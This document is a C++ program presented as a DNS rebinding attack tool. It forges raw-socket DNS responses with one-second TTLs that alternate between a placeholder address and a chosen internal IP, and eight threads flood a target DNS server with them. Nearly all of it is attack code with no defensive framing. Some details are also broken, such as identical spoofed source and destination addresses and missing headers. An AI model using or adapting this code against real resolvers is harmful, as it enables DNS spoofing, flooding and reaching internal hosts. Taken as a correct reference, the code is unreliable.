// Compile: g++ -o rebind rebind.cpp -lpthread
// Run: sudo ./rebind <target_dns> <attacker_domain> <internal_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <atomic>

class DNSRebinding {
private:
    std::string targetDNS, attackerDomain, internalIP;
    std::atomic<bool> running{true};
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    DNSRebinding(const std::string& dns, const std::string& domain,
                 const std::string& internal)
        : targetDNS(dns), attackerDomain(domain), internalIP(internal) {}
    
    // Return very short TTL so cache expires quickly, allowing re-binding
    void sendRebindResponse(uint16_t txid, uint16_t port, 
                            const std::string& responseIP, uint32_t ttl) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);
        
        int pos = 12;
        pos += encodeName(dns + pos, attackerDomain);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(ttl); pos += 4;  // Very short TTL
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        struct in_addr addr;
        inet_aton(responseIP.c_str(), &addr);
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        udp->source = htons(53);
        udp->dest = htons(port);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    // Continuous rebinding: alternate between attacker IP and internal IP
    void rebindLoop() {
        while (running.load()) {
            for (int i = 0; i < 10000; i++) {
                uint16_t txid = rand() & 0xFFFF;
                uint16_t port = 1024 + (rand() % 64000);
                
                // Alternate between two IPs with 1-second TTL
                const std::string& ip = (i % 2) ? internalIP : "1.2.3.4";
                sendRebindResponse(txid, port, ip, 1);
            }
            usleep(1000);  // 1ms between batches
        }
    }
    
    void run() {
        std::cout << "[*] DNS rebinding attack - alternating responses\n";
        std::cout << "[*] Domain: " << attackerDomain << "\n";
        std::cout << "[*] Internal target: " << internalIP << "\n";
        
        std::vector<std::thread> threads;
        for (int t = 0; t < 8; t++) {
            threads.emplace_back([this]() { rebindLoop(); });
        }
        
        // Run for 60 seconds
        std::this_thread::sleep_for(std::chrono::seconds(60));
        running = false;
        
        for (auto& t : threads) t.join();
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_dns> <attacker_domain> <internal_ip>\n";
        return 1;
    }
    srand(time(NULL));
    DNSRebinding rebind(argv[1], argv[2], argv[3]);
    rebind.run();
    return 0;
}
